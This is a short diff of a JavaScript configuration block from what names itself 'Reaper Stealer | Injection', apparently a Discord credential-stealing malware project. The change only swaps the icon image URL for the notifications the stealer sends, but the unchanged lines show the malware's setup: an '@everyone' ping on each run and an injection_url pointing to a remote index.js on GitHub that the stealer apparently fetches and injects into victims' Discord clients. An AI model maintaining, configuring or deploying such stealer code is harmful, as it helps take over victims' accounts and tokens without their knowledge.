@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Reaper Stealer | Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1261890856739409972/1262047642788040745/reaper.png?ex=66952cf5&is=6693db75&hm=ed10363019e2f7cb9a890774df6e3a0305a342d619f7b65e20450e02b758b906&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/AizenWo/Discord-Injection/main/index.js', 
   /**
